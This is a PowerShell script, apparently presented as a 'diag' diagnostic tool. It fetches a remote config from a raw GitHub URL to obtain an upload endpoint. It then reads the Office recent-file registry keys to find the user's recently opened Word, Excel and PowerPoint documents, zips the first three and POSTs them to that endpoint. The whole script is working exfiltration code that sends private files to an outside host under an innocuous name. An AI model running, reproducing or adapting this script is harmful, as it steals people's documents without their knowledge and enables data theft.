Write-Host "== 1 config =="
$u='https://raw.githubusercontent.com/Capyvests/office-demmo/refs/heads/main/config.txt'
try{
 $wc=New-Object Net.WebClient
 $t=$wc.DownloadString("$u`?t=$([DateTime]::UtcNow.Ticks)")
 Write-Host "bytes: $($t.Length)"
 $c=($t -split "`n" | Where-Object{$_ -match '='}) -join "`n" | ConvertFrom-StringData
 Write-Host "endpoint: $($c.endpoint)"
}catch{Write-Host "ERRO: $($_.Exception.Message)"}

Write-Host "== 2 MRU =="
$ext='.docx','.doc','.docm','.pptx','.ppt','.pptm','.xlsx','.xls'
$p=@()
foreach($v in '16.0','15.0','14.0'){foreach($a in 'Word','PowerPoint','Excel'){
 $k="HKCU:\Software\Microsoft\Office\$v\$a\File MRU"
 if(Test-Path $k){$o=Get-ItemProperty $k
  $o.PSObject.Properties.Name|Where-Object{$_ -like 'Item*'}|ForEach-Object{$p+=(($o.$_ -split '\*')[-1]).Trim()}}
}}
Write-Host "brutos: $($p.Count)"
$p=$p|Where-Object{$_ -and ($ext -contains [IO.Path]::GetExtension($_).ToLower()) -and (Test-Path $_)}|Select-Object -Unique
Write-Host "validos: $($p.Count)"
$p|ForEach-Object{Write-Host "  $_"}

Write-Host "== 3 zip =="
Add-Type -AssemblyName System.IO.Compression.FileSystem
$o2=Join-Path $env:TEMP 'diag_out'
New-Item -ItemType Directory -Path $o2 -Force|Out-Null
$p|Select-Object -First 3|ForEach-Object{Copy-Item -LiteralPath $_ -Destination $o2 -Force}
$z=Join-Path $env:TEMP 'diag.zip'
if(Test-Path $z){Remove-Item $z -Force}
if($p.Count -gt 0){[IO.Compression.ZipFile]::CreateFromDirectory($o2,$z);Write-Host "zip: $((Get-Item $z).Length) bytes"}
else{Write-Host "zip: nao criado"}

Write-Host "== 4 POST =="
Add-Type -AssemblyName System.Net.Http
try{
 $cli=New-Object Net.Http.HttpClient
 $mp=New-Object Net.Http.MultipartFormDataContent
 $fs=[IO.File]::OpenRead($z)
 $mp.Add((New-Object Net.Http.StreamContent($fs)),'files[0]','diag.zip')
 $pc=New-Object Net.Http.StringContent('{"content":"diag"}')
 $pc.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/json')
 $mp.Add($pc,'payload_json')
 $r=$cli.PostAsync($c.endpoint,$mp).Result
 Write-Host "HTTP: $([int]$r.StatusCode)"
 Write-Host ($r.Content.ReadAsStringAsync().Result)
}catch{Write-Host "ERRO: $($_.Exception.Message)"}
